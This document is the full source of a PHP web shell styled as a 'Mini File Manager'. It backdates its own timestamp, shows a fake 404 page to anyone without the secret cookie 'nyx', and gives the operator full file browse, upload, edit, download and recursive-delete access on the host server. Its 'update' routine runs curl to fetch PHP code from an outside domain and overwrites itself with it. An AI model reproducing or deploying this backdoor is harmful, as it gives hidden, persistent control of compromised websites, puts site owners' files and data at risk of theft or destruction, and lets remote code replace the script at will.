<?php
@touch(__FILE__,1416400738);
if (!isset($_COOKIE['X-Auth-Token']) || $_COOKIE['X-Auth-Token'] !== 'nyx') {
    
    $missingPath = '/zb/upload/nonexistent-' . microtime(true); 

 
    $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $url = $scheme . '://' . $_SERVER['HTTP_HOST'] . $missingPath;

    $page = false;
    $headers = array();

  
    if (function_exists('stream_context_create')) {
        $opts = array('http' => array('ignore_errors' => true));
        $ctx = stream_context_create($opts);
        $page = @file_get_contents($url, false, $ctx);
        if (isset($http_response_header)) {
            $headers = $http_response_header;
        }
    } else {
        
        $page = @file_get_contents($url);
    }

    
    if (!empty($headers)) {
        foreach ($headers as $h) {
            if (stripos($h, 'Content-Length:') === false) {
                header($h, true);
            }
        }
    } else {
       
        header("HTTP/1.1 404 Not Found");
    }


    if ($page !== false && strlen($page) > 0) {
        echo $page;
    } else {
  
        header("HTTP/1.0 404 Not Found");
        exit;
    }

    exit;
}
// Version: 1.1
@ini_set('display_errors', 1);
@ini_set('display_startup_errors', 1);
@error_reporting(E_ALL);
@ini_set('memory_limit', '256M');
@set_time_limit(300);

// ===============================
// Environment & helpers
// ===============================
@error_reporting(E_ALL & ~E_NOTICE);
@ini_set('display_errors', 1);

// Script version
$scriptVersion = '1.1';

// Detect PHP 4 for compatibility
$isPhp4 = version_compare(PHP_VERSION, '5.0.0', '<');

// Base directory (script's directory)
$base = @realpath(dirname(__FILE__));
if (!$base) $base = dirname(__FILE__); // Fallback for PHP 4
$home = @realpath('/home') ? @realpath('/home') : $base;
$root = @realpath($_SERVER['DOCUMENT_ROOT']) ? @realpath($_SERVER['DOCUMENT_ROOT']) : $base;

// Normalize paths for consistent comparison
$base = str_replace('\\', '/', $base);
$home = str_replace('\\', '/', $home);
$root = str_replace('\\', '/', $root);

// Current directory
$path = $isPhp4 ? (isset($HTTP_GET_VARS['path']) ? $HTTP_GET_VARS['path'] : '.') : (isset($_GET['path']) ? $_GET['path'] : '.');
$dir = @realpath($path);
if (!$dir || !@is_dir($dir) || !@is_readable($dir)) {
    $dir = $base; // Fallback to base if path is invalid or not readable
}
$dir = str_replace('\\', '/', $dir);

// --- Update Logic ---
function fetch_url($url) {
    $content = '';
    // Try curl first
    if (function_exists('exec')) {
        $tmpDir = '/tmp';
        if (!@is_dir($tmpDir) || !@is_writable($tmpDir)) {
            $tmpDir = $GLOBALS['base'];
        }
        $tmpFile = $tmpDir . '/' . md5(uniqid(mt_rand(), true)) . '.txt';
        @exec('curl -s ' . escapeshellarg($url) . ' > ' . $tmpFile . ' 2>/dev/null');
        if (@file_exists($tmpFile)) {
            $f = @fopen($tmpFile, 'r');
            if ($f) {
                while (!@feof($f)) {
                    $content .= @fread($f, 8192);
                }
                @fclose($f);
                @unlink($tmpFile);
            }
        }
    }
    // Fallback to fopen
    if (!$content && @ini_get('allow_url_fopen')) {
        $fp = @fopen($url, 'r');
        if ($fp) {
            while (!@feof($fp)) {
                $content .= @fread($fp, 8192);
            }
            @fclose($fp);
        }
    }
    // Normalize content
    $content = trim($content);
    // Remove BOM
    if (substr($content, 0, 3) === "\xEF\xBB\xBF") {
        $content = substr($content, 3);
    }
    // Normalize line endings
    $content = str_replace("\r\n", "\n", $content);
    $content = preg_replace('/^\n+/', '', $content); // Remove leading newlines
    return $content;
}

if ($isPhp4 ? isset($HTTP_GET_VARS['update']) : isset($_GET['update'])) {
    $updateUrl = 'https://heritageangkortours.com/nyx.txt';
    $newScript = fetch_url($updateUrl);
    if (!$newScript) {
        echo "<div class='msg error'>Update failed: Could not fetch update file from $updateUrl.</div>";
    } else {
        // Relaxed check for <?php
        if (!preg_match('/^\s*<\?php\b/i', $newScript)) {
            echo "<div class='msg error'>Update failed: Update file is not valid PHP (must start with &lt;?php).</div>";
        } else {
            // Extract version
            $newVersion = '0.0';
            if (preg_match('/\/\/\s*Version:\s*([\d.]+)/i', $newScript, $matches)) {
                $newVersion = $matches[1];
            } else {
                echo "<div class='msg error'>Update failed: Could not find version in update file.</div>";
            }
            if (version_compare($newVersion, $scriptVersion, '>')) {
                $tmpFile = $base . '/04.php.tmp.' . md5(uniqid(mt_rand(), true));
                $fallbackFile = $base . '/04.php.fallback';
                if (!@is_writable($base)) {
                    echo "<div class='msg error'>Update failed: Script directory is not writable.</div>";
                } elseif (@copy(__FILE__, $fallbackFile)) {
                    if (safe_put($tmpFile, $newScript)) {
                        if (safe_rename($tmpFile, __FILE__)) {
                            @unlink($fallbackFile);
                            echo "<div class='msg success'>Updated to version " . h($newVersion) . ". <a href='?path=" . urlencode($dir) . "'>Refresh</a></div>";
                            exit;
                        } else {
                            @unlink($tmpFile);
                            if (@copy($fallbackFile, __FILE__)) {
                                @unlink($fallbackFile);
                                echo "<div class='msg error'>Update failed: Could not replace script. Restored original.</div>";
                            } else {
                                echo "<div class='msg error'>Update failed: Could not replace script and could not restore original. Fallback saved as " . h(basename($fallbackFile)) . ".</div>";
                            }
                        }
                    } else {
                        @unlink($fallbackFile);
                        echo "<div class='msg error'>Update failed: Could not save new script.</div>";
                    }
                } else {
                    echo "<div class='msg error'>Update failed: Could not create fallback copy.</div>";
                }
            } else {
                echo "<div class='msg success'>No updates available. Current version: " . h($scriptVersion) . ".</div>";
            }
        }
    }
}

// --- Helpers ---
function safe_mkdir($path) {
    if (function_exists("mkdir")) {
        if (@mkdir($path, 0777) || @is_dir($path)) return true;
    }
    if (function_exists('exec')) {
        @exec('mkdir ' . escapeshellarg($path) . ' 2>/dev/null');
        return @is_dir($path);
    }
    return false;
}

function safe_rename($old, $new) {
    if (function_exists("rename")) {
        if (@rename($old, $new)) return true;
    }
    if (@copy($old, $new)) {
        @unlink($old);
        return @is_file($new);
    }
    return false;
}

function deleteDirectory($file) {
    if (!@file_exists($file)) return true;
    if (!@is_dir($file)) return @unlink($file);
    $items = @scandir($file);
    if ($items === false) $items = array();
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $file . '/' . $item;
        if (!deleteDirectory($path)) return false;
    }
    return @rmdir($file);
}

function safe_put($file, $data) {
    if (!@is_writable(dirname($file))) return false;
    $f = @fopen($file, "w");
    if (!$f) return false;
    $ok = @fwrite($f, $data);
    @fclose($f);
    return ($ok !== false);
}

function safe_get($file) {
    $arr = @file($file);
    if ($arr === false) return false;
    return implode("", $arr);
}

function h($s) {
    return htmlspecialchars($s, ENT_QUOTES);
}

function mime_by_extension($filename) {
    static $map = array(
        'txt' => 'text/plain', 'html' => 'text/html', 'htm' => 'text/html', 'css' => 'text/css', 'js' => 'application/javascript',
        'json' => 'application/json', 'xml' => 'application/xml', 'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'png' => 'image/png',
        'gif' => 'image/gif', 'pdf' => 'application/pdf', 'zip' => 'application/zip', 'tar' => 'application/x-tar',
        'gz' => 'application/gzip', 'rar' => 'application/vnd.rar', 'mp3' => 'audio/mpeg', 'mp4' => 'video/mp4', 'csv' => 'text/csv'
    );
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return isset($map[$ext]) ? $map[$ext] : 'application/octet-stream';
}

// -------------------------------
// DOWNLOAD HANDLER
// -------------------------------
if ($isPhp4 ? isset($HTTP_GET_VARS['download']) : isset($_GET['download'])) {
    $downloadParam = $isPhp4 ? $HTTP_GET_VARS['download'] : $_GET['download'];
    $baseName = basename($downloadParam);
    $candidate = $dir . '/' . $baseName;
    $filePath = false;
    if (@is_file($candidate) && @is_readable($candidate)) {
        $filePath = $candidate;
    } elseif (@is_file($downloadParam) && @is_readable($downloadParam)) {
        $real = @realpath($downloadParam);
        if ($real !== false) {
            $filePath = $real;
        }
    }
    if ($filePath === false) {
        @header("HTTP/1.0 404 Not Found");
        echo "<div class='msg error'>File not found or not readable.</div>";
        exit;
    }
    $mime = mime_by_extension($filePath);
    while (@ob_get_level() > 0) @ob_end_clean();
    $filename = basename($filePath);
    $fallbackName = preg_replace('/[^A-Za-z0-9._-]/', '_', $filename);
    @header("Content-Description: File Transfer");
    @header("Content-Type: " . $mime);
    @header('Content-Disposition: attachment; filename="' . $fallbackName . '"; filename*=UTF-8\'\'' . rawurlencode($filename));
    @header("Content-Transfer-Encoding: binary");
    @header('Expires: 0');
    @header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    @header('Pragma: public');
    @header("Content-Length: " . @filesize($filePath));
    $chunkSize = 8192;
    $handle = @fopen($filePath, 'rb');
    if ($handle === false) {
        @readfile($filePath);
        exit;
    }
    while (!@feof($handle)) {
        echo @fread($handle, $chunkSize);
        @flush();
        @ob_flush();
    }
    @fclose($handle);
    exit;
}

// -------------------------------
// UPLOAD
// -------------------------------
$filesVar = $isPhp4 ? (isset($HTTP_POST_FILES) ? $HTTP_POST_FILES : array()) : (isset($_FILES) ? $_FILES : array());
if (!empty($filesVar['file']['name'])) {
    $target = $dir . '/' . basename($filesVar['file']['name']);
    if (@is_writable($dir)) {
        if (function_exists("move_uploaded_file") && @move_uploaded_file($filesVar['file']['tmp_name'], $target)) {
            echo "<div class='msg success'>Uploaded: " . h($filesVar['file']['name']) . "</div>";
        } elseif (@copy($filesVar['file']['tmp_name'], $target)) {
            echo "<div class='msg success'>Uploaded (copy fallback): " . h($filesVar['file']['name']) . "</div>";
        } else {
            echo "<div class='msg error'>Upload failed! Check directory permissions.</div>";
        }
    } else {
        echo "<div class='msg error'>Upload failed! Directory is not writable.</div>";
    }
}

// -------------------------------
// DELETE
// -------------------------------
if ($isPhp4 ? isset($HTTP_GET_VARS['delete']) : isset($_GET['delete'])) {
    $targetRel = basename($isPhp4 ? $HTTP_GET_VARS['delete'] : $_GET['delete']);
    $target = $dir . '/' . $targetRel;
    $realTarget = @realpath($target);
    if ($realTarget && $realTarget !== $base && $realTarget !== $home && $realTarget !== '/') {
        if (@is_writable($target) && deleteDirectory($target)) {
            echo "<div class='msg success'>Deleted: " . h($targetRel) . "</div>";
        } else {
            echo "<div class='msg error'>Delete failed! Check permissions or if directory contains protected files.</div>";
        }
    } else {
        echo "<div class='msg error'>Delete failed! Invalid or protected path.</div>";
    }
}

// -------------------------------
// RENAME
// -------------------------------
$postVar = $isPhp4 ? (isset($HTTP_POST_VARS) ? $HTTP_POST_VARS : array()) : (isset($_POST) ? $_POST : array());
if ($isPhp4 ? isset($HTTP_GET_VARS['rename']) : isset($_GET['rename']) && !empty($postVar['new_name'])) {
    $targetRel = basename($isPhp4 ? $HTTP_GET_VARS['rename'] : $_GET['rename']);
    $target = $dir . '/' . $targetRel;
    $realTarget = @realpath($target);
    $newName = basename($postVar['new_name']);
    $newPath = $dir . '/' . $newName;
    if ($realTarget && $realTarget !== $base && $realTarget !== $home && $realTarget !== '/') {
        if (@file_exists($target) && !@file_exists($newPath) && @is_writable($dir) && safe_rename($target, $newPath)) {
            echo "<div class='msg success'>Renamed to: " . h($newName) . "</div>";
        } else {
            echo "<div class='msg error'>Rename failed! Check if the new name already exists or directory permissions.</div>";
        }
    } else {
        echo "<div class='msg error'>Rename failed! Invalid or protected path.</div>";
    }
}

// -------------------------------
// CREATE FOLDER
// -------------------------------
if (!empty($postVar['newfolder'])) {
    $newDir = $dir . '/' . basename($postVar['newfolder']);
    if (!@is_dir($newDir) && @is_writable($dir) && safe_mkdir($newDir)) {
        echo "<div class='msg success'>Folder created: " . h($postVar['newfolder']) . "</div>";
    } else {
        echo "<div class='msg error'>Failed to create folder. Check directory permissions.</div>";
    }
}

// -------------------------------
// CREATE FILE
// -------------------------------
if (!empty($postVar['newfile'])) {
    $newFile = $dir . '/' . basename($postVar['newfile']);
    if (!@file_exists($newFile) && @is_writable($dir)) {
        if (safe_put($newFile, "")) {
            echo "<div class='msg success'>File created: " . h($postVar['newfile']) . "</div>";
        } else {
            echo "<div class='msg error'>Failed to create file. Check directory permissions.</div>";
        }
    } else {
        echo "<div class='msg error'>File already exists or directory is not writable.</div>";
    }
}

// -------------------------------
// EDIT (save)
// -------------------------------
if (!empty($postVar['edit_file']) && isset($postVar['file_content'])) {
    $editRel = basename($postVar['edit_file']);
    $editFile = $dir . '/' . $editRel;
    $realEditFile = @realpath($editFile);
    if ($realEditFile && @is_file($editFile) && @is_writable($editFile)) {
        $saved = false;
        if (safe_put($editFile, $postVar['file_content'])) {
            $saved = true;
        } else {
            $tmpName = $editFile . ".tmp." . md5(uniqid(mt_rand(), true));
            if (safe_put($tmpName, $postVar['file_content'])) {
                if (safe_rename($tmpName, $editFile)) {
                    $saved = true;
                } else {
                    @unlink($tmpName);
                }
            }
        }
        if ($saved) {
            echo "<div class='msg success'>Saved changes to: " . h($editRel) . "</div>";
        } else {
            $manualFallback = $dir . '/' . $editRel . '.edited.' . date('Ymd_His') . '.txt';
            if (safe_put($manualFallback, $postVar['file_content'])) {
                echo "<div class='msg error'>Could not overwrite original file (permissions). A copy was saved as: " . h(basename($manualFallback)) . " — download and replace manually if needed.</div>";
            } else {
                echo "<div class='msg error'>Save failed and could not write fallback copy.</div>";
            }
        }
    } else {
        echo "<div class='msg error'>Edit failed! File is not writable or invalid path.</div>";
    }
}

// -------------------------------
// Render File List
// -------------------------------
function renderFileList($dir, $home, $base, $isPhp4) {
    $sort = $isPhp4 ? (isset($GLOBALS['HTTP_GET_VARS']['sort']) ? $GLOBALS['HTTP_GET_VARS']['sort'] : 'name') : (isset($_GET['sort']) ? $_GET['sort'] : 'name');
    $output = "<table><tr><th><a href='?path=" . urlencode($dir) . "&sort=name'>Name</a></th><th>Type</th><th><a href='?path=" . urlencode($dir) . "&sort=size'>Size</a></th><th><a href='?path=" . urlencode($dir) . "&sort=time'>Modified</a></th><th>Action</th></tr>";
    
    // Add [UP] link if not at root
    $parentPath = dirname($dir);
    if ($parentPath !== $dir && @is_dir($parentPath) && @is_readable($parentPath)) {
        $parentRel = urlencode($parentPath);
        $output .= "<tr><td><a href='?path=" . $parentRel . "'>[UP]</a></td><td>Directory</td><td>-</td><td>-</td><td>-</td></tr>";
    }
    
    // Collect directories and files separately
    $dirs = array();
    $files = array();
    if ($handle = @opendir($dir)) {
        while (($f = readdir($handle)) !== false) {
            if ($f == "." || ($f == ".." && $dir === $base)) continue;
            $path = $dir . "/" . $f;
            $item = array(
                'name' => $f,
                'path' => $path,
                'size' => @is_file($path) ? @filesize($path) : 0,
                'mtime' => @filemtime($path)
            );
            if (@is_dir($path)) {
                $dirs[] = $item;
            } else {
                $files[] = $item;
            }
        }
        @closedir($handle);
    }
    
    // Sort functions
    function sort_compare($a, $b) {
        return strnatcmp($a['name'], $b['name']);
    }
    
    function sort_by_size($a, $b) {
        return $b['size'] - $a['size'];
    }
    
    function sort_by_time($a, $b) {
        return $b['mtime'] - $a['mtime'];
    }
    
    // Sort directories and files
    @usort($dirs, 'sort_compare');
    if ($sort === 'size') {
        @usort($files, 'sort_by_size');
    } elseif ($sort === 'time') {
        @usort($files, 'sort_by_time');
    } else {
        @usort($files, 'sort_compare');
    }
    
    // Render directories
    foreach ($dirs as $item) {
        $f = $item['name'];
        $path = $item['path'];
        $relPath = urlencode($path);
        $output .= "<tr><td><a href='?path=" . $relPath . "'>[DIR] " . h($f) . "</a></td><td>Directory</td><td>-</td><td>" . ($item['mtime'] ? date("Y-m-d H:i:s", $item['mtime']) : '-') . "</td><td>";
        if ($path !== $base && $path !== $home && $path !== '/') {
            $output .= "<a href='?path=" . urlencode($dir) . "&delete=" . urlencode($f) . "' onclick='return confirm(\"Delete directory $f and all its contents?\")'>Delete</a> | ";
            $output .= "<a href='?path=" . urlencode($dir) . "&rename=" . urlencode($f) . "'>Rename</a>";
        }
        $output .= "</td></tr>";
    }
    
    // Render files
    foreach ($files as $item) {
        $f = $item['name'];
        $path = $item['path'];
        $relPath = urlencode($path);
        $dlLink = "?path=" . urlencode($dir) . "&download=" . urlencode($f);
        $deleteLink = "?path=" . urlencode($dir) . "&delete=" . urlencode($f);
        $editLink = "?path=" . urlencode($dir) . "&edit=" . urlencode($f);
        $renameLink = "?path=" . urlencode($dir) . "&rename=" . urlencode($f);
        $actions = "<a href='" . h($dlLink) . "'>Download</a>";
        if ($path !== $base && $path !== $home && $path !== '/') {
            $actions .= " | <a href='" . h($deleteLink) . "' onclick='return confirm(\"Delete $f?\")'>Delete</a>";
            $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
            if (in_array($ext, array('txt', 'php', 'html', 'htm', 'css', 'js', 'log'))) {
                $actions .= " | <a href='" . h($editLink) . "'>Edit</a>";
            }
            $actions .= " | <a href='" . h($renameLink) . "'>Rename</a>";
        }
        $output .= "<tr><td>[FILE] " . h($f) . "</td><td>File</td><td>" . $item['size'] . " bytes</td><td>" . ($item['mtime'] ? date("Y-m-d H:i:s", $item['mtime']) : '-') . "</td><td>$actions</td></tr>";
    }
    
    if (empty($dirs) && empty($files) && $parentPath === $dir) {
        $output .= "<tr><td colspan='5'>Unable to open directory.</td></tr>";
    }
    $output .= "</table>";
    return $output;
}

// -------------------------------
// Main Logic
// -------------------------------
$output = renderFileList($dir, $home, $base, $isPhp4);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mini File Manager</title>
    <meta charset="utf-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            font-size: 14px;
            background: #0a0a0a url('https://heritageangkortours.com/nyx.png') no-repeat center center fixed;
            background-size: 700px auto;
            color: #eee;
        }
        h2 {
            margin-top: 0;
            font-size: 28px;
            font-weight: bold;
            color: #00ffcc;
            text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
            background: linear-gradient(45deg, #00ffcc, #00cc99);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center;
            padding: 10px;
        }
        .msg { padding: 8px; margin: 5px 0; border-radius: 4px; }
        .success { background: rgba(0, 128, 0, 0.2); border: 1px solid #4caf50; }
        .error { background: rgba(128, 0, 0, 0.2); border: 1px solid #f44336; }
        table { border-collapse: collapse; width: 100%; background: rgba(0, 0, 0, 0.6); color: #fff; }
        th, td { padding: 6px 10px; border: 1px solid #444; }
        th { background: rgba(255, 255, 255, 0.1); }
        form { margin: 10px 0; }
        input[type=text], input[type=file], textarea {
            background: rgba(0, 0, 0, 0.6);
            color: #fff;
            border: 1px solid #555;
            padding: 6px;
        }
        button {
            padding: 6px 10px;
            cursor: pointer;
            background: #111;
            color: #0f0;
            border: 1px solid #0f0;
            border-radius: 4px;
        }
        button:hover { background: #0f0; color: #111; }
        textarea { width: 100%; height: 300px; font-family: monospace; }
        .panel { background: rgba(0, 0, 0, 0.6); padding: 10px; margin-bottom: 10px; border: 1px solid #333; border-radius: 6px; }
        .small { font-size: 12px; color: #9ee6b7; }
        .sort-links { margin-bottom: 10px; }
        .sort-links a { color: #0f0; margin-right: 10px; }
        .sort-links a:hover { color: #fff; }
        .breadcrumbs { margin-bottom: 10px; }
        .breadcrumbs a { color: #0f0; margin-right: 8px; font-weight: bold; text-decoration: none; }
        .breadcrumbs a:hover { color: #fff; }
        .breadcrumbs a::before { content: '['; }
        .breadcrumbs a::after { content: ']'; }
    </style>
</head>
<body>
<h2>Mini File Manager (v<?php echo h($scriptVersion); ?>)</h2>
<div class="msg success">Current script version: <?php echo h($scriptVersion); ?></div>

<!-- Update Panel -->
<div class="panel">
    <a href="?path=<?php echo urlencode($dir); ?>&update=1"><button>Check for Updates</button></a>
</div>

<!-- Breadcrumbs -->
<div class="panel breadcrumbs">
<?php
$current = @realpath($dir);
$parts = array();
if ($current && @is_dir($current) && @is_readable($current)) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($dir, DIRECTORY_SEPARATOR));
    $linkPath = '';
    if ($current === DIRECTORY_SEPARATOR) {
        echo "<a href='?path=" . urlencode('/') . "'>root</a>";
    } else {
        echo "<a href='?path=" . urlencode('/') . "'>root</a>";
        foreach ($parts as $p) {
            if (!$p) continue;
            $linkPath .= DIRECTORY_SEPARATOR . $p;
            $realLinkPath = @realpath($linkPath);
            if ($realLinkPath && @is_dir($realLinkPath) && @is_readable($realLinkPath)) {
                echo " <a href='?path=" . urlencode($realLinkPath) . "'>" . h($p) . "</a>";
            }
        }
    }
} else {
    echo "<div class='msg error'>Warning: Unable to build navigation trail.</div>";
}
?>
</div>

<div class="sort-links">
    Sort by: 
    <a href="?path=<?php echo urlencode($dir); ?>&sort=name">Name</a>
    <a href="?path=<?php echo urlencode($dir); ?>&sort=size">Size</a>
    <a href="?path=<?php echo urlencode($dir); ?>&sort=time">Modified</a>
</div>
<div class="panel">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload</button>
    </form>
</div>
<div class="panel">
    <form method="post">
        <input type="text" name="newfolder" placeholder="New folder name">
        <button type="submit">Create Folder</button>
    </form>
</div>
<div class="panel">
    <form method="post">
        <input type="text" name="newfile" placeholder="New file name">
        <button type="submit">Create File</button>
    </form>
</div>
<?php
// Rename form for specific file/directory
if ($isPhp4 ? isset($HTTP_GET_VARS['rename']) : isset($_GET['rename'])) {
    $renameRel = basename($isPhp4 ? $HTTP_GET_VARS['rename'] : $_GET['rename']);
    $renamePath = $dir . '/' . $renameRel;
    $realRenamePath = @realpath($renamePath);
    if ($realRenamePath && $realRenamePath !== $base && $realRenamePath !== $home && $realRenamePath !== '/') {
        echo "<div class='panel'>";
        echo "<h3>Rename: " . h($renameRel) . "</h3>";
        echo "<form method='post' action='?path=" . urlencode($dir) . "&rename=" . urlencode($renameRel) . "'>";
        echo "<input type='text' name='new_name' placeholder='New name' value='" . h($renameRel) . "'>";
        echo "<button type='submit'>Rename</button>";
        echo "</form>";
        echo "</div>";
    } else {
        echo "<div class='panel'><div class='msg error'>Invalid or protected path for renaming.</div></div>";
    }
}
?>
<?php echo $output; ?>
<?php
// Edit viewer/editor
if ($isPhp4 ? isset($HTTP_GET_VARS['edit']) : isset($_GET['edit'])) {
    $editRel = basename($isPhp4 ? $HTTP_GET_VARS['edit'] : $_GET['edit']);
    $editFile = $dir . "/" . $editRel;
    $realEditFile = @realpath($editFile);
    if ($realEditFile && @is_file($editFile) && @is_readable($editFile)) {
        $content = safe_get($editFile);
        if ($content === false) $content = "";
        echo "<div class='panel'><h3>Editing: " . h($editRel) . "</h3> <form method='post'> <input type='hidden' name='edit_file' value='" . h($editRel) . "'> <textarea name='file_content'>" . h($content) . "</textarea><br><br> <button type='submit'>Save</button> </form></div>";
    } else {
        echo "<div class='panel'><div class='msg error'>File not readable for editing or invalid path.</div></div>";
    }
}
?>
<p class="small">Tip: If saving fails due to permissions, a downloadable copy (.edited.YYYYMMDD_HHMMSS.txt) is created. Directory deletions are recursive; ensure you confirm before deleting.</p>
</body>
</html>
